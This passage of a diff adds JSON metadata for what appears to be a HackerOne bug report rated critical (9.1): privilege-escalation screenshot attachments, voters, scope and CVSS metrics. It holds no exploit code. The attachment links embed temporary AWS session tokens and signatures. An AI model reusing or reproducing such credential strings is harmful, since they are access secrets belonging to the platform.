w5VkBevQTJ0SBwymCTFZDqWoF0L9dR4VlSQPC7Vg0rPWK%2FgMmdjFb3qVxnTtP4V%2FZC%2Bmq1ao6t8ovvACstrb%2FipjWvBk9uu7eIoWt0CDxOrWyFLkw44D9zwY6sQHfD7GsNGzCwc%2F9EebOqukVTHLOQECqcB%2BY2rnbgL4%2Fa0QxE1PEo7pbHRvePgIoUYit7jfxwtEAypJGJ8UaQirZuH15LYN%2FKJtCqU0jTUV5NTorZYHLY7%2F0gt9Gn4zttOSm355Wl2vm32qbu958noCBAeZo6982NsfKFhZxKyedSl5jCPoFvcsZ4q4Zzg0Foy%2FXr0X01vbwebHBns95S7mKebnLLlUmdQzJUxF%2FIMDaj3I%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=058087999e4fe5dbf1168ad7f5793415f79a33c8ecbb60884c56c30ca4f6d6b8",
+      "file_size": 76566,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1262348,
+      "file_name": "initial-escalate.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/v9chdn3s4njz677vko9imah0vf5j?response-content-disposition=attachment%3B%20filename%3D%22initial-escalate.png%22%3B%20filename%2A%3DUTF-8%27%27initial-escalate.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSPM2ZFYU%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151455Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIHG3lvhdV6Q%2FNc2D6sKlTHsRGYZrweI22t6ry9kpUdp%2BAiEAuGNNUGnDsygOalEC0wdPeLjEfO9kjJmzSqRIXat21U4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDB2DhZGUpFzp%2F6DQniqPBQCNUW%2BJNaek3k4RaCLGTVdoLYx0n5tgq5uLPBI3LH%2BNvmjoP%2BtzR%2FKSzkRkgj73nKw7jlai%2BJxC7xzMXjjhEfsTJLCOyNCLXDetgNq3OlvERYLL6cjaJnCKG3dXDyyn5riCq0TLTTmL5BwD%2FR%2BU25AG4rXkS04FqMqD2N%2B2KTcQ4YhLhZ0ZBYU35nsRgjvTPwBSxumomKMLG4mxNw%2BNzkk4rZLehL8e8d8vBukqth9tvZKLNKRKj1eTmi6wstYSo%2B7sxRM9kAY14rdVe2R%2BU63QA8NQZllDKHZQALqw3YrtrGw9NgfbWHfu2ouCB97W6lDYAAmXUQMRz5%2Bbjrt4jTI0pTL5JhgPLheWJXOCAaiGNCS65KlBbt%2FHStTfMnlU5QVKIJo41t%2BdwdrX9QneTYofUrTIcQdfOMmRpubgHz5QGhQlxYlIg%2BYqn1oxPVHj%2FjVcj0ETtwJJ1pWgbGhA%2F7N1yI9v9nsS%2B7P5xf0QN9bwvakkVdUy7zAg6duxSGZBjX0Fhzz%2BLO%2BZlnmHMTyelWpQyC8NV6t3thY3otZ9lfKd4je1ct%2BElWJczJchoIU32uYh4LahB%2BRX1c7WBpf%2F1s3ZlTnS6krpSp8txBBw5PbPH0t3bXjoKOwQ2lcGNdtfcqKqJdryXl7mmbL6FZjDeT01AIqyi82BQREkRIFrekqMTFHp3FVe86zjzoImC8w8PcuWYdmS1tKrhedEXS3RUQkwjEUtL88wSyjppMCrH5itHf6QvXWQQYfYdhHw5VkBevQTJ0SBwymCTFZDqWoF0L9dR4VlSQPC7Vg0rPWK%2FgMmdjFb3qVxnTtP4V%2FZC%2Bmq1ao6t8ovvACstrb%2FipjWvBk9uu7eIoWt0CDxOrWyFLkw44D9zwY6sQHfD7GsNGzCwc%2F9EebOqukVTHLOQECqcB%2BY2rnbgL4%2Fa0QxE1PEo7pbHRvePgIoUYit7jfxwtEAypJGJ8UaQirZuH15LYN%2FKJtCqU0jTUV5NTorZYHLY7%2F0gt9Gn4zttOSm355Wl2vm32qbu958noCBAeZo6982NsfKFhZxKyedSl5jCPoFvcsZ4q4Zzg0Foy%2FXr0X01vbwebHBns95S7mKebnLLlUmdQzJUxF%2FIMDaj3I%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4491e4ec54f1d22e1611c45681ec54de8d76995fe948849322a0f1d20dbe5add",
+      "file_size": 121429,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1262349,
+      "file_name": "updated2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ikwv892hlai8k6xqn733rl3a4pab?response-content-disposition=attachment%3B%20filename%3D%22updated2.png%22%3B%20filename%2A%3DUTF-8%27%27updated2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSPM2ZFYU%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151455Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIHG3lvhdV6Q%2FNc2D6sKlTHsRGYZrweI22t6ry9kpUdp%2BAiEAuGNNUGnDsygOalEC0wdPeLjEfO9kjJmzSqRIXat21U4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDB2DhZGUpFzp%2F6DQniqPBQCNUW%2BJNaek3k4RaCLGTVdoLYx0n5tgq5uLPBI3LH%2BNvmjoP%2BtzR%2FKSzkRkgj73nKw7jlai%2BJxC7xzMXjjhEfsTJLCOyNCLXDetgNq3OlvERYLL6cjaJnCKG3dXDyyn5riCq0TLTTmL5BwD%2FR%2BU25AG4rXkS04FqMqD2N%2B2KTcQ4YhLhZ0ZBYU35nsRgjvTPwBSxumomKMLG4mxNw%2BNzkk4rZLehL8e8d8vBukqth9tvZKLNKRKj1eTmi6wstYSo%2B7sxRM9kAY14rdVe2R%2BU63QA8NQZllDKHZQALqw3YrtrGw9NgfbWHfu2ouCB97W6lDYAAmXUQMRz5%2Bbjrt4jTI0pTL5JhgPLheWJXOCAaiGNCS65KlBbt%2FHStTfMnlU5QVKIJo41t%2BdwdrX9QneTYofUrTIcQdfOMmRpubgHz5QGhQlxYlIg%2BYqn1oxPVHj%2FjVcj0ETtwJJ1pWgbGhA%2F7N1yI9v9nsS%2B7P5xf0QN9bwvakkVdUy7zAg6duxSGZBjX0Fhzz%2BLO%2BZlnmHMTyelWpQyC8NV6t3thY3otZ9lfKd4je1ct%2BElWJczJchoIU32uYh4LahB%2BRX1c7WBpf%2F1s3ZlTnS6krpSp8txBBw5PbPH0t3bXjoKOwQ2lcGNdtfcqKqJdryXl7mmbL6FZjDeT01AIqyi82BQREkRIFrekqMTFHp3FVe86zjzoImC8w8PcuWYdmS1tKrhedEXS3RUQkwjEUtL88wSyjppMCrH5itHf6QvXWQQYfYdhHw5VkBevQTJ0SBwymCTFZDqWoF0L9dR4VlSQPC7Vg0rPWK%2FgMmdjFb3qVxnTtP4V%2FZC%2Bmq1ao6t8ovvACstrb%2FipjWvBk9uu7eIoWt0CDxOrWyFLkw44D9zwY6sQHfD7GsNGzCwc%2F9EebOqukVTHLOQECqcB%2BY2rnbgL4%2Fa0QxE1PEo7pbHRvePgIoUYit7jfxwtEAypJGJ8UaQirZuH15LYN%2FKJtCqU0jTUV5NTorZYHLY7%2F0gt9Gn4zttOSm355Wl2vm32qbu958noCBAeZo6982NsfKFhZxKyedSl5jCPoFvcsZ4q4Zzg0Foy%2FXr0X01vbwebHBns95S7mKebnLLlUmdQzJUxF%2FIMDaj3I%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=166ad02c651e84a72d082f3111d8825e7432c23823c1084cc470bc4b0dda7c0b",
+      "file_size": 159076,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1262350,
+      "file_name": "second-escalate.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xzstm9jrhbm607koq1zmgg4os97e?response-content-disposition=attachment%3B%20filename%3D%22second-escalate.png%22%3B%20filename%2A%3DUTF-8%27%27second-escalate.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSPM2ZFYU%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151455Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIHG3lvhdV6Q%2FNc2D6sKlTHsRGYZrweI22t6ry9kpUdp%2BAiEAuGNNUGnDsygOalEC0wdPeLjEfO9kjJmzSqRIXat21U4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDB2DhZGUpFzp%2F6DQniqPBQCNUW%2BJNaek3k4RaCLGTVdoLYx0n5tgq5uLPBI3LH%2BNvmjoP%2BtzR%2FKSzkRkgj73nKw7jlai%2BJxC7xzMXjjhEfsTJLCOyNCLXDetgNq3OlvERYLL6cjaJnCKG3dXDyyn5riCq0TLTTmL5BwD%2FR%2BU25AG4rXkS04FqMqD2N%2B2KTcQ4YhLhZ0ZBYU35nsRgjvTPwBSxumomKMLG4mxNw%2BNzkk4rZLehL8e8d8vBukqth9tvZKLNKRKj1eTmi6wstYSo%2B7sxRM9kAY14rdVe2R%2BU63QA8NQZllDKHZQALqw3YrtrGw9NgfbWHfu2ouCB97W6lDYAAmXUQMRz5%2Bbjrt4jTI0pTL5JhgPLheWJXOCAaiGNCS65KlBbt%2FHStTfMnlU5QVKIJo41t%2BdwdrX9QneTYofUrTIcQdfOMmRpubgHz5QGhQlxYlIg%2BYqn1oxPVHj%2FjVcj0ETtwJJ1pWgbGhA%2F7N1yI9v9nsS%2B7P5xf0QN9bwvakkVdUy7zAg6duxSGZBjX0Fhzz%2BLO%2BZlnmHMTyelWpQyC8NV6t3thY3otZ9lfKd4je1ct%2BElWJczJchoIU32uYh4LahB%2BRX1c7WBpf%2F1s3ZlTnS6krpSp8txBBw5PbPH0t3bXjoKOwQ2lcGNdtfcqKqJdryXl7mmbL6FZjDeT01AIqyi82BQREkRIFrekqMTFHp3FVe86zjzoImC8w8PcuWYdmS1tKrhedEXS3RUQkwjEUtL88wSyjppMCrH5itHf6QvXWQQYfYdhHw5VkBevQTJ0SBwymCTFZDqWoF0L9dR4VlSQPC7Vg0rPWK%2FgMmdjFb3qVxnTtP4V%2FZC%2Bmq1ao6t8ovvACstrb%2FipjWvBk9uu7eIoWt0CDxOrWyFLkw44D9zwY6sQHfD7GsNGzCwc%2F9EebOqukVTHLOQECqcB%2BY2rnbgL4%2Fa0QxE1PEo7pbHRvePgIoUYit7jfxwtEAypJGJ8UaQirZuH15LYN%2FKJtCqU0jTUV5NTorZYHLY7%2F0gt9Gn4zttOSm355Wl2vm32qbu958noCBAeZo6982NsfKFhZxKyedSl5jCPoFvcsZ4q4Zzg0Foy%2FXr0X01vbwebHBns95S7mKebnLLlUmdQzJUxF%2FIMDaj3I%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=de527aeced4ba2adec2df272057fbf8d36a2b6c897beef02cf36fc731c399f51",
+      "file_size": 131268,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1262353,
+      "file_name": "jira-escalate.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fxq9p3rxwtebpokb8s3cuz765bmb?response-content-disposition=attachment%3B%20filename%3D%22jira-escalate.png%22%3B%20filename%2A%3DUTF-8%27%27jira-escalate.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSPM2ZFYU%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151455Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIHG3lvhdV6Q%2FNc2D6sKlTHsRGYZrweI22t6ry9kpUdp%2BAiEAuGNNUGnDsygOalEC0wdPeLjEfO9kjJmzSqRIXat21U4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDB2DhZGUpFzp%2F6DQniqPBQCNUW%2BJNaek3k4RaCLGTVdoLYx0n5tgq5uLPBI3LH%2BNvmjoP%2BtzR%2FKSzkRkgj73nKw7jlai%2BJxC7xzMXjjhEfsTJLCOyNCLXDetgNq3OlvERYLL6cjaJnCKG3dXDyyn5riCq0TLTTmL5BwD%2FR%2BU25AG4rXkS04FqMqD2N%2B2KTcQ4YhLhZ0ZBYU35nsRgjvTPwBSxumomKMLG4mxNw%2BNzkk4rZLehL8e8d8vBukqth9tvZKLNKRKj1eTmi6wstYSo%2B7sxRM9kAY14rdVe2R%2BU63QA8NQZllDKHZQALqw3YrtrGw9NgfbWHfu2ouCB97W6lDYAAmXUQMRz5%2Bbjrt4jTI0pTL5JhgPLheWJXOCAaiGNCS65KlBbt%2FHStTfMnlU5QVKIJo41t%2BdwdrX9QneTYofUrTIcQdfOMmRpubgHz5QGhQlxYlIg%2BYqn1oxPVHj%2FjVcj0ETtwJJ1pWgbGhA%2F7N1yI9v9nsS%2B7P5xf0QN9bwvakkVdUy7zAg6duxSGZBjX0Fhzz%2BLO%2BZlnmHMTyelWpQyC8NV6t3thY3otZ9lfKd4je1ct%2BElWJczJchoIU32uYh4LahB%2BRX1c7WBpf%2F1s3ZlTnS6krpSp8txBBw5PbPH0t3bXjoKOwQ2lcGNdtfcqKqJdryXl7mmbL6FZjDeT01AIqyi82BQREkRIFrekqMTFHp3FVe86zjzoImC8w8PcuWYdmS1tKrhedEXS3RUQkwjEUtL88wSyjppMCrH5itHf6QvXWQQYfYdhHw5VkBevQTJ0SBwymCTFZDqWoF0L9dR4VlSQPC7Vg0rPWK%2FgMmdjFb3qVxnTtP4V%2FZC%2Bmq1ao6t8ovvACstrb%2FipjWvBk9uu7eIoWt0CDxOrWyFLkw44D9zwY6sQHfD7GsNGzCwc%2F9EebOqukVTHLOQECqcB%2BY2rnbgL4%2Fa0QxE1PEo7pbHRvePgIoUYit7jfxwtEAypJGJ8UaQirZuH15LYN%2FKJtCqU0jTUV5NTorZYHLY7%2F0gt9Gn4zttOSm355Wl2vm32qbu958noCBAeZo6982NsfKFhZxKyedSl5jCPoFvcsZ4q4Zzg0Foy%2FXr0X01vbwebHBns95S7mKebnLLlUmdQzJUxF%2FIMDaj3I%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=212a304f192e3120451ee6fda173d87baa5f7a4ca532ae5928ab993fa68b4fcd",
+      "file_size": 100039,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 16,
+  "voters": [
+    "mr-medi",
+    "taha",
+    "run_win",
+    "akashhamal0x01",
+    "sudi",
+    "h4x0r_dz",
+    "sa1tama0",
+    "cryptographer",
+    "raymatp",
+    "beerboy_ankit",
+    "and 6 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.1,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 3,
+    "asset_type": "URL",
+    "asset_identifier": "hackerone.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
